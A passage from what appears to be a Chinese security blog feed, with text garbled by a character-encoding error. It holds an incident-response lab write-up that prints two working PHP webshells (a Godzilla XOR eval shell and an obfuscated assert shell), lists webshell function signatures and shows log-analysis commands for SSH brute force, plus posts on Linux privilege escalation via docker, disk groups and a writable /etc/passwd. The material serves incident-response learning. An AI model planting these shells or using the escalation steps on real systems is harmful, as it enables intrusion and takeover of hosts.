alt="image-20240709155032413"></p><p>å…ˆçœ‹ä¸€ä¸ªç®€å•çš„shellæ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151645944.png" alt="image-20240709155214961"></p><p>è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„webshell</p><p>å†æ‰¾æ‰¾å…¶ä»–çš„ï¼Œåœ¨gz.phpæ‰¾çš„çš„webshellæ¯”è¾ƒç‰¹åˆ«</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-comment">//027ccd04-5065-48b6-a32d-77c704a5e26d</span><br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>!==<span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ç¬¬ä¸€ä¸ªflagï¼Œflag{027ccd04-5065-48b6-a32d-77c704a5e26d}</p><p>ç„¶åå°±æ˜¯çœ‹æ˜¯ä»€ä¹ˆç±»å‹çš„webshellï¼Œè¿™é‡Œå¯ä»¥æ˜æ˜¾çœ‹åˆ°æ˜¯å“¥æ–¯æ‹‰çš„æµé‡ç‰¹å¾ï¼Œæ˜¯å“¥æ–¯æ‹‰é‡Œé¢çš„ä¸€ä¸ªå¼‚æˆ–åŠ å¯†è„šæœ¬</p><p>å“¥æ–¯æ‹‰çš„githubåœ°å€ï¼š<a href="https://github.com/BeichenDream/Godzilla%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9B%E8%A1%8Cmd5%E5%B0%B1%E6%98%AFflag%EF%BC%8Cflag%7B39392de3218c333f794befef07ac9257%7D">https://github.com/BeichenDream/Godzillaï¼Œç„¶åè¿›è¡Œmd5å°±æ˜¯flagï¼Œflag{39392de3218c333f794befef07ac9257}</a></p><p>éšè—shellå°±æ˜¯ä¸Šé¢Dç›¾æŸ¥æ‰¾å‡ºçš„.Mysqlli.php</p><p><img src="http://cdn.clown2024.cn/202407151645945.png" alt="image-20240709160839574"></p><p>ä¹Ÿæ˜¯ä¸€ä¸ªå“¥æ–¯æ‹‰çš„shellï¼Œè·¯å¾„å°±ä¸ºï¼š&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.phpï¼Œflagä¸ºflag{aebac0e58cd6c5fad1695ee4d1ac1919}</p><p>æœ€åä¸€ä¸ªæ˜¯å…æ€é©¬ï¼Œè¿™é‡Œé™æ€æ£€æµ‹å°±æ£€æµ‹ä¸åˆ°äº†ï¼Œä½†æ˜¯webshellæ‰§è¡Œçš„è¯ä¼šåœ¨æ—¥å¿—ç•™ä¸‹è®°å½•ï¼Œå¯ä»¥å»æ—¥å¿—é‡Œé¢çœ‹ä¸€çœ‹ï¼ŒLinuxçš„æ—¥å¿—åœ¨**&#x2F;var&#x2F;log**ç›®å½•ä¸‹</p><p>ä¸è¿‡Dç›¾å·²ç»æŠŠä»–æ‰«å‡ºæ¥äº†ï¼Œå°±æ˜¯top.phpï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨æ—¥å¿—access.logä¸­çœ‹åˆ°ä»–çš„è®°å½•</p><p><img src="http://cdn.clown2024.cn/202407151645946.png" alt="image-20240709161714553"></p><p>top.phpå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;password&quot;</span>;<br><br><span class="hljs-comment">//ERsDHgEUC1hI</span><br><span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>]);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$fun</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">7</span>];<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;s&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$s</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func2&quot;</span>];<br><span class="hljs-variable">$c</span>(<span class="hljs-variable">$fun</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿›è¡Œäº†æ··æ·†å’ŒåŠ å¯†ï¼Œè·¯å¾„md5å°±æ˜¯flagï¼Œflag{EEFF2EABFD9B7A6D26FC1A53D3F7D1DE}</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/administratorlws/article/details/139521078%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E6%89%8B%E5%B7%A5%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%8C%E6%80%BB%E7%BB%93%E4%BA%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81webshell%E7%89%B9%E5%BE%81">https://blog.csdn.net/administratorlws/article/details/139521078ï¼Œé‡Œé¢æœ‰æ‰‹å·¥æŸ¥æ€çš„æ–¹å¼ï¼Œæ€»ç»“äº†ä¸€äº›å¸¸è§webshellç‰¹å¾</a></p><p>è¿™é‡Œcopyä¸€äº›çŸ¥è¯†ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//å„webshellçš„å±é™©å‡½æ•°<br>PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()<br>ASP: Execute(), Eval(), CreateObject()<br>JSP: Runtime.getRuntime().exec()<br><br>//æ–‡ä»¶æ“ä½œ<br>PHP: fopen(), fwrite(), file_get_contents(), file_put_contents()<br>ASP: FileSystemObject<br><br>//ç½‘ç»œæ“ä½œ<br>PHP: fsockopen(), curl_exec(), file_get_contents(&#x27;http://...&#x27;)<br>ASP: WinHttp.WinHttpRequest<br></code></pre></td></tr></table></figure><p>æ‰‹å·¥æŸ¥æ€å…æ€å¯ä»¥çœ‹ä»–æœ‰æ²¡æœ‰ç¼–ç å‡½æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><h1 id="linuxæ—¥å¿—åˆ†æ"><a href="#Linuxæ—¥å¿—åˆ†æ" class="headerlink" title="Linuxæ—¥å¿—åˆ†æ"></a>Linuxæ—¥å¿—åˆ†æ</h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è´¦å·rootå¯†ç linuxrz<br>ssh root@IP<br>1.æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²<br>2.sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²<br>3.çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²<br>4.ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡<br>5.é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæŸ¥çœ‹æœ‰å¤šå°‘ipåœ¨çˆ†ç ´sshçš„rootè´¦å·é‚£å°±å»æŸ¥çœ‹&#x2F;var&#x2F;logä¸‹çš„æ—¥å¿—</p><p><img src="http://cdn.clown2024.cn/202407151645947.png" alt="image-20240709182756986"></p><p>çœ‹auth.log.1é‡Œé¢çš„ç™»é™†å¤±è´¥ä¿¡æ¯ï¼Œè¿™ä¸ªæ˜¯auth.logçš„å½’æ¡£æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>å‘½ä»¤è§£é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cat /var/log/auth.log.1ï¼šcat å‘½ä»¤ç”¨äºè¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼Œè¿™é‡Œæ˜¯ç”¨æ¥æ˜¾ç¤º /var/log/auth.log.1 æ–‡ä»¶çš„å†…å®¹ã€‚<br><br>grep -a &quot;Failed password for root&quot;ï¼šgrep å‘½ä»¤ç”¨äºæœç´¢åŒ…å«ç‰¹å®šæ–‡æœ¬çš„è¡Œã€‚è¿™é‡Œæœç´¢çš„æ˜¯åŒ…å«æ–‡æœ¬ &quot;Failed password for root&quot; çš„è¡Œï¼Œè¡¨ç¤º root ç”¨æˆ·ç™»å½•å¤±è´¥çš„äº‹ä»¶ã€‚-a é€‰é¡¹æ˜¯å‘Šè¯‰ grep ä»¥æ–‡æœ¬æ–‡ä»¶çš„æ–¹å¼å¤„ç†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¿è¯è¾“å‡ºçš„ä¸€è‡´æ€§ã€‚<br><br>awk &#x27;&#123;print $11&#125;&#x27;ï¼šawk æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬å¤„ç†å·¥å…·ã€‚è¿™é‡Œ &#123;print $11&#125; è¡¨ç¤ºæ‰“å°æ¯è¡Œçš„ç¬¬11ä¸ªå­—æ®µã€‚åœ¨ auth.log ä¸­ï¼Œç¬¬11ä¸ªå­—æ®µé€šå¸¸æ˜¯ç™»å½•å¤±è´¥æ—¶å°è¯•ä½¿ç”¨çš„ç”¨æˆ·åã€‚<br><br>sortï¼šsort å‘½ä»¤å¯¹è¾“å…¥çš„è¡Œè¿›è¡Œæ’åºã€‚ç”±äºå‰é¢ awk è¾“å‡ºçš„æ˜¯ root ç”¨æˆ·çš„ç™»å½•å¤±è´¥è¡Œï¼Œè¿™é‡Œçš„ sort å°†è¿™äº›è¡Œè¿›è¡Œå­—å…¸åºæ’åºã€‚<br><br>uniq -cï¼šuniq å‘½ä»¤ç”¨äºè¿‡æ»¤æ‰æ’åºåçš„é‡å¤è¡Œã€‚-c é€‰é¡¹è¡¨ç¤ºåœ¨æ¯è¡Œå‰æ˜¾ç¤ºè¯¥è¡Œåœ¨æ–‡ä»¶ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚<br><br>sort -nrï¼šå†æ¬¡ä½¿ç”¨ sort å‘½ä»¤ï¼Œ-n é€‰é¡¹è¡¨ç¤ºæŒ‰ç…§æ•°å€¼æ’åºï¼Œ-r é€‰é¡¹è¡¨ç¤ºé™åºæ’åºã€‚è¿™é‡Œå¯¹ uniq å‘½ä»¤çš„è¾“å‡ºç»“æœæŒ‰å‡ºç°æ¬¡æ•°è¿›è¡Œé™åºæ’åºã€‚<br><br>moreï¼šmore å‘½ä»¤ç”¨äºåˆ†é¡µæ˜¾ç¤ºè¾“å‡ºç»“æœï¼Œå…è®¸ç”¨æˆ·é€æ­¥æŸ¥çœ‹é•¿è¾“å‡ºï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§æ˜¾ç¤ºæ‰€æœ‰å†…å®¹ã€‚<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ‰¾åˆ°3ä¸ªip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br>192.168.200.32<br>192.168.200.31<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645948.png" alt="image-20240709183107694"></p><p>çˆ†ç ´æˆåŠŸçš„ç”¨æˆ·å°±å»æŸ¥â€Acceptedâ€çš„å­—æ®µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Accepted&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645949.png" alt="image-20240709183249678"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br></code></pre></td></tr></table></figure><p>çˆ†ç ´ç”¨æˆ·å‘½çš„å­—å…¸å°±æŸ¥â€Failed passwordâ€å­—æ®µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs BASH"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password&quot;</span> |perl -e <span class="hljs-string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|<span class="hljs-built_in">uniq</span> -c|<span class="hljs-built_in">sort</span> -nr<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645950.png" alt="image-20240709183507195"></p><p>æŸ¥æ‰¾ç™»å½•æˆåŠŸç™»é™†çš„ipä¸€å…±çˆ†ç ´äº†å¤šå°‘æ¬¡ï¼Œå°±æŸ¥çœ‹â€Failed password for rootâ€å­—æ®µï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªçš„æŸ¥è¯¢ï¼Œå‰é¢çš„æ•°å­—å°±æ˜¯ç™»é™†æ¬¡æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>åé—¨ç”¨æˆ·å°±æŸ¥â€new userâ€å­—æ®µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 |grep -a <span class="hljs-string">&quot;new user&quot;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645951.png" alt="image-20240709183835955"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥çœ‹&#x2F;etc&#x2F;passwdçš„å†…å®¹</p><p><img src="http://cdn.clown2024.cn/202407151645952.png" alt="image-20240709183913790"></p><p>åé—¨ç”¨æˆ·æ˜¯test2</p><p><strong>æ¥è¡¥å……ä¸€ä¸‹æ—¥å¿—ç›¸å…³çš„çŸ¥è¯†</strong></p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://developer.aliyun.com/article/1477704">https://developer.aliyun.com/article/1477704</a></p><p>ä¸Šé¢æŸ¥è¯¢çš„å­—æ®µæ˜¯æ—¥å¿—çš„çº§åˆ«ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Invalid user è¡¨ç¤ºå°è¯•ä½¿ç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ·ç™»å½•ç³»ç»Ÿã€‚<br>Failed password è¡¨ç¤ºä¸ºæŸä¸ªç”¨æˆ·è¾“å…¥äº†é”™è¯¯çš„å¯†ç ã€‚<br>authentication failure è¡¨ç¤ºè®¤è¯å¤±è´¥ã€‚<br>Connection closed è¡¨ç¤ºè¿æ¥è¢«å…³é—­ã€‚<br>Accepted password è¡¨ç¤ºå¯†ç è®¤è¯æˆåŠŸã€‚<br>new user æˆ– new group è¡¨ç¤ºåˆ›å»ºäº†æ–°ç”¨æˆ·æˆ–æ–°ç”¨æˆ·ç»„ã€‚<br>password changed è¡¨ç¤ºç”¨æˆ·å¯†ç è¢«æ›´æ”¹ã€‚<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥å“åº”wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åº”æ€¥å“åº” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxææƒ-ä¸å®‰å…¨é…ç½®é¡¹</title>
      <link href="/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/"/>
      <url>/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸å®‰å…¨çš„ç”¨æˆ·ç»„"><a href="#ä¸å®‰å…¨çš„ç”¨æˆ·ç»„" class="headerlink" title="ä¸å®‰å…¨çš„ç”¨æˆ·ç»„"></a>ä¸å®‰å…¨çš„ç”¨æˆ·ç»„</h1><p><strong>diskç”¨æˆ·ç»„</strong></p><p>diskç”¨æˆ·ç»„æ˜¯Linuxä¸­ä¸€ä¸ªç‰¹æ®Šçš„ç”¨æˆ·ç»„ï¼Œç»„å†…æˆå‘˜å¯ä»¥å¯¹ä¸€äº›å—è®¾å¤‡(æ¯”å¦‚ç¡¬ç›˜ã€CDç­‰)è¿›è¡Œè¯»å†™ã€‚å¦‚æœå±äºdiskç”¨æˆ·ç»„ï¼Œå°±å¯ä»¥æ‰“å¼€Linuxçš„å†…ç½®å·¥å…·debugfsçš„äº¤äº’å¼å‘½ä»¤è¡Œï¼Œå¹¶å¯ä»¥æŒ‚è½½åˆ°æ–‡ä»¶ç³»ç»Ÿæ¥è°ƒè¯•æ–‡ä»¶</p><p>å…ˆdfå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç£ç›˜ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span><br></code></pre></td></tr></table></figure><p>å‡è®¾å½“å‰çš„ç›®å½•åˆ†åŒºä¸º&#x2F;dev&#x2F;sda2ï¼Œç„¶ådebugfsæ‰“å¼€äº¤äº’å¼å‘½ä»¤è¡Œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">debugfs /dev/sda2<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å°±å¯ä»¥å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œè°ƒè¯•</p><p><strong>admç”¨æˆ·ç»„</strong></p><p>æ­¤ç»„çš„æˆå‘˜é€šå¸¸æ‹¥æœ‰è¯»å–å’Œå†™å…¥ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶ã€æŸ¥çœ‹ç³»ç»Ÿæ€§èƒ½æŒ‡æ ‡ä»¥åŠæ‰§è¡Œå…¶ä»–ç³»ç»Ÿç®¡ç†ä»»åŠ¡çš„æƒé™ã€‚å¯ä»¥æŸ¥çœ‹&#x2F;var&#x2F;logä¸‹çš„ç›®å½•ç³»ç»Ÿæ•æ„Ÿæ—¥å¿—</p><p><strong>shadowç”¨æˆ·ç»„</strong></p><p>&#x2F;etc&#x2F;shadowç”¨äºå­˜å‚¨ç”¨æˆ·å¯†ç ï¼Œé™¤äº†rootç”¨æˆ·ï¼Œè¿˜æœ‰shadowç”¨æˆ·ç»„æˆå‘˜ä¹Ÿå¯ä»¥æŸ¥çœ‹è¯¥æ–‡ä»¶ã€‚</p><p><strong>lxdç”¨æˆ·ç»„</strong></p><p>æ”¹ç»„æˆå‘˜å¯ä»¥ä½¿ç”¨Linuxå®¹å™¨(LXD)ã€‚</p><p>Linuxå®¹å™¨æ˜¯ä¸€ç§è½»é‡çº§çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œèƒ½å¤Ÿåœ¨å•ä¸ªLinuxç³»ç»Ÿä¸Šè¿è¡Œå¤šä¸ªç‹¬ç«‹çš„Linuxå®ä¾‹ã€‚</p><p>ç”¨æˆ·æ‰€å±è¯¥ç»„æ—¶ï¼Œå¯ä»¥ä½¿ç”¨lxcå‘½ä»¤åˆ›å»ºæ–°å®¹å™¨ï¼Œç„¶åå°†å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½è‡³å®¹å™¨ä¸­ï¼Œå³å¯æŸ¥çœ‹å®¿ä¸»æœºçš„æ•æ„Ÿæ–‡ä»¶ç­‰æ“ä½œ</p><p><strong>Dockerç”¨æˆ·ç»„</strong></p><p>Linuxå®‰è£…å®Œdockerä¹‹åä¼šåˆ›å»ºä¸€ä¸ªåä¸ºdockerçš„ç”¨æˆ·ç»„ã€‚å¦‚æœå±äºè¿™ä¸ªç»„æˆ–è€…æ˜¯rootç”¨æˆ·å°±å¯ä»¥ä½¿ç”¨dockerå‘½ä»¤å°è¯•ææƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run -v /:/mnt -it alpine <span class="hljs-comment">#è¯¥å‘½ä»¤ç”¨äºå°†å®¿ä¸»æœºçš„æ ¹ç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„/mntç›®å½•ä¸‹</span><br><span class="hljs-comment"># æ‰§è¡Œè¿™æ¡å‘½ä»¤æ—¶ï¼Œdockeræ£€æŸ¥æ˜¯å¦å­˜åœ¨alpineé•œåƒï¼Œä¸å­˜åœ¨ä¼šä»docker hubä¸­ä¸‹è½½ï¼Œç„¶åä»¥è¯¥é•œåƒä½œä¸ºåŸºç¡€</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥åœ¨å®¹å™¨ä¸­è®¿é—®å®¿ä¸»æœºçš„ç³»ç»Ÿæ–‡ä»¶äº†</p><h1 id="ä¸å®‰å…¨çš„è¯»å†™æƒé™"><a href="#ä¸å®‰å…¨çš„è¯»å†™æƒé™" class="headerlink" title="ä¸å®‰å…¨çš„è¯»å†™æƒé™"></a>ä¸å®‰å…¨çš„è¯»å†™æƒé™</h1><p><strong>å¯å†™çš„&#x2F;etc&#x2F;passwdæ–‡ä»¶</strong></p><p>æŸ¥çœ‹&#x2F;etc&#x2F;passwdçš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -lh /etc/passwd<br></code></pre></td></tr></table></figure><p>å¦‚æœå­˜åœ¨ä»»æ„ç”¨æˆ·å¯ä»¥è¯»å†™çš„æƒ…å†µï¼Œå°±å¯ä»¥ç”Ÿæˆç”¨æˆ·ä¿¡æ¯æ·»åŠ åˆ°è¯¥æ–‡ä»¶ä¸­</p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤ç”Ÿæˆå¸¦ç›å¯†ç </p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">perl -le <span class="hljs-string">&#x27;print crypt(&quot;123456&quot;,&quot;suiyi&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>å¯è¯»çš„&#x2F;etc&#x2F;shadowæ–‡ä»¶</strong></p>]]></content>
      
      
      <categories>
          
          <category> Linuxææƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linuxææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxææƒ-ä¿¡æ¯æœé›†</title>
      <link href="/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="æœåŠ¡å™¨ä¿¡æ¯æšä¸¾"><a href="#æœåŠ¡å™¨ä¿¡æ¯æšä¸¾" class="headerlink" title="æœåŠ¡å™¨ä¿¡æ¯æšä¸¾"></a>æœåŠ¡å™¨ä¿¡æ¯æšä¸¾</h1><p><strong>åˆ¤æ–­æ˜¯å¦è™šæ‹ŸåŒ–</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">systemd-detect-virt <span class="hljs-comment">#è¯†åˆ«ç³»ç»Ÿè¿è¡Œç¯å¢ƒï¼Œçœ‹æ˜¯å¦è™šæ‹ŸåŒ–</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511101.png" alt="image-20240625200028837"></p><p><strong>æŸ¥æ‰¾å½“å‰shellæ˜¯å¦å¤„äºdockerä¸­</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;docker&#x27;</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a <span class="hljs-comment">#å¯ä»¥çœ‹åˆ°æ“ä½œç³»ç»Ÿåç§°ã€ç‰ˆæœ¬ã€æ¶æ„ã€ä¸»æœºåã€å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯ç­‰</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -r<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç³»ç»Ÿæ¶æ„ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> 